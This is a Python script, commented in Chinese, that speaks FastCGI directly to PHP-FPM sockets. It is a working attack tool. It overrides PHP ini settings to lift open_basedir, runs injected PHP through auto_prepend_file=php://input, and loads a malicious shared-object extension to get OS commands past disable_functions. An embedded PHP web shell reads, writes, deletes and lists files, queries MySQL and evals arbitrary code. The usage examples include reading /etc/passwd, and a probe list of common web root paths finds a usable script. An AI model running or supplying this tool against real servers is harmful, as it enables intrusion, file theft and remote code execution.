#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FastCGI(FPM) 客户端 —— open_basedir 绕过 / disable_functions 下的 PHP 代码执行 / 恶意扩展加载

用法（先 probe 找到可用的 SCRIPT_FILENAME）:
  fcgi_client.py probe  --target unix:///tmp/php-cgi-74.sock
  fcgi_client.py read   --target unix:///tmp/php-cgi-74.sock --script <已存在的.php> --path /etc/passwd
  fcgi_client.py ls     --target unix:///tmp/php-cgi-74.sock --script <php> --path /www
  fcgi_client.py write  --target ... --script <php> --path /tmp/a.php --data-b64 PD9waHA...
  fcgi_client.py exec   --target ... --script <php> --code 'echo "hi";'
  fcgi_client.py ext    --target ... --script <php> --so-dir /tmp --so-name evil --code 'evil_cmd("id");'
  fcgi_client.py status --target unix:///tmp/php-cgi-74.sock --script <php>

要点:
  * BEGIN_REQUEST body 必须 8 字节: roleB1 roleB0 flags reserved[5]
    (= PHP pack('nCx5',1,0) / nginx struct ngx_http_fastcgi_begin_request_t)
    php-src main/fastcgi.c 校验 `len == sizeof(fcgi_begin_request)`，7 字节直接断链。
  * open_basedir 是运行时检查 → PHP_ADMIN_VALUE 可覆盖成 /
  * allow_url_include=On + auto_prepend_file=php://input → STDIN 里的 PHP 代码被执行（不落盘）
  * disable_functions 在 worker 启动时已从符号表移除 → ini 清空无效；要 OS 命令只能挂 .so(extension_dir+extension)
  * SCRIPT_FILENAME 必须存在且以 .php 结尾（FPM security.limit_extensions 默认 .php）
"""
import argparse, base64, socket, struct, sys

FCGI_VERSION = 1
BEGIN_REQUEST, ABORT_REQUEST, END_REQUEST, PARAMS, STDIN, STDOUT, STDERR = 1, 2, 3, 4, 5, 6, 7
FCGI_RESPONDER = 1
MAX_CHUNK = 4000


def rec(rtype, content=b"", reqid=1):
    pad = (8 - len(content) % 8) % 8
    return struct.pack(">BBHHBB", FCGI_VERSION, rtype, reqid, len(content), pad, 0) + content + b"\x00" * pad


def _enc(v):
    if isinstance(v, str):
        v = v.encode()
    if len(v) < 0x80:
        return bytes([len(v)]) + v
    return struct.pack(">I", len(v) | 0x80000000) + v


def params_records(env, reqid=1):
    blob = b"".join(_enc(k) + _enc(v) for k, v in env.items())
    out = b""
    for i in range(0, max(len(blob), 1), MAX_CHUNK):
        out += rec(PARAMS, blob[i:i + MAX_CHUNK], reqid)
    return out + rec(PARAMS, b"", reqid)


def begin_record(reqid=1, keep_conn=False):
    # roleB1=0, roleB0=1(FCGI_RESPONDER), flags, reserved[5]  -> 恰好 8 字节
    body = struct.pack(">BBB5s", 0, FCGI_RESPONDER, 1 if keep_conn else 0, b"\x00" * 5)
    assert len(body) == 8, "BEGIN_REQUEST body 必须 8 字节"
    return rec(BEGIN_REQUEST, body, reqid)


def connect(target, timeout=10):
    if target.startswith("unix://"):
        if not hasattr(socket, "AF_UNIX"):
            sys.exit("[!] 当前 Python 不支持 AF_UNIX（Windows 常见）—— 请在跳板机/目标机 Linux 上跑本脚本，或改用 host:port")
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(target[len("unix://"):])
        return s
    host, _, port = target.rpartition(":")
    s = socket.create_connection((host.strip("[]"), int(port)), timeout)
    s.settimeout(timeout)
    return s


def run(target, env, body=b"", reqid=None, timeout=15, quiet=False):
    """发一个 FastCGI 请求，收齐 STDOUT/STDERR/END_REQUEST"""
    s = connect(target, timeout)
    pkt = begin_record() + params_records(env)
    pkt += rec(STDIN, body) + rec(STDIN, b"")
    s.sendall(pkt)
    out, err, end = b"", b"", None
    try:
        while True:
            hdr = b""
            while len(hdr) < 8:
                c = s.recv(8 - len(hdr))
                if not c:
                    raise EOFError
                hdr += c
            ver, t, rid, clen, pad, _ = struct.unpack(">BBHHBB", hdr)
            buf = b""
            while len(buf) < clen + pad:
                c = s.recv(clen + pad - len(buf))
                if not c:
                    break
                buf += c
            buf = buf[:clen]
            if t == STDOUT:
                out += buf
            elif t == STDERR:
                err += buf
            elif t == END_REQUEST:
                end = buf
                break
    except (EOFError, socket.timeout, ConnectionResetError):
        pass
    finally:
        s.close()
    if not quiet and err:
        sys.stderr.write("[STDERR] " + err.decode("utf-8", "replace") + "\n")
        if b"denied" in err or b"Primary script unknown" in err:
            sys.stderr.write("[HINT] SCRIPT_FILENAME 必须指向磁盘上**真实存在**且以 .php 结尾的文件"
                             "（FPM security.limit_extensions）；先跑 `probe` 或从已知源码/报错里挖路径\n")
    return out, err, end


def base_env(script, params, body=b"", method="POST"):
    env = {
        "SCRIPT_FILENAME": script,
        "SCRIPT_NAME": "/" + script.rsplit("/", 1)[-1],
        "DOCUMENT_ROOT": "/".join(script.split("/")[:-1]),
        "REQUEST_METHOD": method,
        "REQUEST_URI": "/" + script.rsplit("/", 1)[-1],
        "SERVER_PROTOCOL": "HTTP/1.1",
        "SERVER_SOFTWARE": "fcgi_client.py",
        "REMOTE_ADDR": "127.0.0.1",
        "QUERY_STRING": "",
        "CONTENT_TYPE": "application/x-www-form-urlencoded",
    }
    if body:
        env["CONTENT_LENGTH"] = str(len(body))
    env.update(params)
    return env


PHP_SHELL = r"""<?php
$p=base64_decode('%(path)s');$d=base64_decode('%(data)s');$m='%(mode)s';
switch($m){
 case 'read':$c=@file_get_contents($p);echo $c===false?'__ERR__':base64_encode($c);break;
 case 'write':$n=@file_put_contents($p,$d);echo $n===false?'__ERR__':"OK:$n";break;
 case 'ls':$l=@scandir($p);echo $l===false?'__ERR__':implode("\n",$l);break;
 case 'stat':echo json_encode(@stat($p));break;
 case 'unlink':echo @unlink($p)?'OK':'__ERR__';break;
 case 'glob':$g=@glob($p);echo $g===false?'__ERR__':implode("\n",$g);break;
 case 'db':$my=@new mysqli('127.0.0.1','%(dbu)s','%(dbp)s','%(dbn)s',3306);
   if($my->connect_errno){echo '__ERR__:'.$my->connect_error;break;}
   $r=@$my->query(base64_decode('%(data)s'));if(!$r){echo '__ERR__:'.$my->error;break;}
   if($r===true){echo 'OK:aff='.$my->affected_rows;break;}
   $rows=[];while($row=$r->fetch_assoc())$rows[]=array_map('base64_encode',$row);
   echo json_encode($rows);break;
 default:eval($d);break;
}
die();
"""


def php_payload(mode, path="", data="", **kw):
    return (PHP_SHELL % dict(mode=mode, path=base64.b64encode(path.encode()).decode(),
                             data=base64.b64encode(data.encode()).decode(),
                             dbn=kw.get("dbn", ""), dbu=kw.get("dbu", ""), dbp=kw.get("dbp", ""))).encode()


def make_env(script, ini_lines, extra=None, body=b""):
    params = {}
    if ini_lines:
        params["PHP_ADMIN_VALUE"] = "\n".join(ini_lines) + "\n"
        params["PHP_VALUE"] = "\n".join(ini_lines) + "\n"
    if extra:
        params.update(extra)
    return base_env(script, params, body=body, method="POST" if body else "GET")


CANDIDATE_SCRIPTS = [
    "/www/wwwroot/index.php", "/var/www/html/index.php", "/data/www/index.php",
    "/www/server/phpmyadmin/index.php", "/www/project/index.php",
]

MODES = {
    "read": ("path",), "write": ("path", "data-b64"), "ls": ("path",),
    "stat": ("path",), "unlink": ("path",), "glob": ("path",), "exec": ("code",),
}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("mode", choices=["probe", "read", "write", "ls", "stat", "unlink", "glob", "exec", "ext", "status", "raw", "db"])
    ap.add_argument("--target", required=True, help="unix:///tmp/php-cgi-74.sock 或 127.0.0.1:9000")
    ap.add_argument("--script", help="已存在的 .php（SCRIPT_FILENAME，需绕 limit_extensions）")
    ap.add_argument("--path")
    ap.add_argument("--data-b64")
    ap.add_argument("--dbn", help="db 模式：库名")
    ap.add_argument("--dbu", help="db 模式：用户名")
    ap.add_argument("--dbp", help="db 模式：口令")
    ap.add_argument("--sql-b64", help="db 模式：base64 的 SQL")
    ap.add_argument("--code", help="exec 模式：raw PHP 代码（在 open_basedir=/ 下执行）")
    ap.add_argument("--so-dir", help="ext 模式：extension_dir")
    ap.add_argument("--so-name", help="ext 模式：扩展名，如 evil")
    ap.add_argument("--ini", action="append", default=[], help="追加 ini 覆盖，如 --ini 'disable_classes='")
    ap.add_argument("--no-open-basedir", action="store_true", help="不加 open_basedir=/ 覆盖")
    ap.add_argument("--timeout", type=int, default=15)
    a = ap.parse_args()

    ini = list(a.ini)
    if not a.no_open_basedir:
        ini.insert(0, "open_basedir=/")
    ini += ["allow_url_include=On", "auto_prepend_file=php://input"]

    if a.mode == "probe":
        ok = []
        for c in ([a.script] if a.script else CANDIDATE_SCRIPTS):
            env = make_env(c, ini, body=b"<?php echo 'FCGI_OK';die();")
            out, err, end = run(a.target, env, body=b"<?php echo 'FCGI_OK';die();", timeout=a.timeout)
            tag = "OK" if b"FCGI_OK" in out else ("DENIED" if b"denied" in err.lower() or b"Access" in err else "FAIL")
            print(f"{tag:6} {c}  end={end is not None} out={out[:60]!r}")
            if tag == "OK":
                ok.append(c)
        print("\n可用 SCRIPT_FILENAME:", ok or "无（用 --script 指定磁盘上真实存在的 .php）")

    elif a.mode == "status":
        extra = {"SCRIPT_NAME": "/status", "QUERY_STRING": "full"}
        env = make_env(a.script, ini, extra=extra)
        out, _, _ = run(a.target, env, timeout=a.timeout)
        print(out.decode("utf-8", "replace"))

    elif a.mode == "raw":
        env = make_env(a.script, ini, body=(a.code or "").encode())
        out, _, _ = run(a.target, env, body=(a.code or "").encode(), timeout=a.timeout)
        sys.stdout.write(out.decode("utf-8", "replace"))

    elif a.mode == "ext":
        extra = {"extension_dir": a.so_dir, "extension": a.so_name}
        body = ("<?php " + (a.code or "phpinfo();") + " die();").encode()
        env = make_env(a.script, ini, extra=extra, body=body)
        out, err, end = run(a.target, env, body=body, timeout=a.timeout)
        sys.stdout.write(out.decode("utf-8", "replace"))

    else:
        if a.mode == "exec":
            data = a.code or "echo 'no-code';"
        elif a.mode == "db":
            data = base64.b64decode(a.sql_b64).decode("utf-8", "replace") if a.sql_b64 else "SELECT 1"
        else:
            data = base64.b64decode(a.data_b64).decode("utf-8", "surrogateescape") if a.data_b64 else ""
        body = php_payload(a.mode, a.path or "", data, dbn=a.dbn or "", dbu=a.dbu or "", dbp=a.dbp or "")
        env = make_env(a.script, ini, body=body)
        out, err, end = run(a.target, env, body=body, timeout=a.timeout)
        txt = out.decode("utf-8", "replace")
        if a.mode == "read" and txt and not txt.startswith("__ERR__"):
            import re
            if re.fullmatch(r"[A-Za-z0-9+/=\s]+", txt):
                try:
                    sys.stdout.buffer.write(base64.b64decode(txt, validate=True))
                    return
                except Exception:
                    pass
        print(txt)


if __name__ == "__main__":
    main()
